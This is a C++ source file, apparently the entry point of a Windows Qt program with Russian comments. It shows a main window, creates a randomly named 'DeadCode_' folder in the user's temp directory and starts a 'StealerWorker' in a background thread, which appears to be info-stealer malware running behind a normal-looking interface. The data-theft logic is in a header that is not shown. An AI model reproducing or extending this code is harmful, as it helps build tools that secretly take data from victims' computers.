#include <windows.h>
#include <ntstatus.h>
#include <iostream>
#include <mutex>
#include <gdiplus.h>
#include <QApplication>
#include <QThread>
#include <QDir>
#include <QString>

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "stealerworker.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr; // Возвращена
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Точка входа
int main(int argc, char *argv[]) {
    // Инициализация GDI+
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok) {
        std::cerr << "Не удалось инициализировать GDI+" << std::endl;
        return -1;
    }

    // Инициализация QApplication
    QApplication app(argc, argv);

    // Создание главного окна
    MainWindow w;
    g_mainWindow = &w; // Установка указателя
    w.show();

    // Создание временной директории для StealerWorker
    QString tempDir = QString::fromStdString(std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp")) +
                      "\\DeadCode_" + w.generateRandomString(8);
    QDir dir;
    if (!dir.exists(tempDir)) {
        dir.mkpath(tempDir);
    }

    // Настройка StealerWorker в отдельном потоке
    StealerWorker* worker = new StealerWorker(&w, tempDir);
    QThread* thread = new QThread;
    worker->moveToThread(thread);

    // Подключение сигналов и слотов
    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    // Запуск потока
    thread->start();

    // Запуск тестов
    w.runTests();

    // Запуск главного цикла приложения
    int result = app.exec();

    // Очистка
    g_mainWindow = nullptr; // Сброс указателя
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return result;
}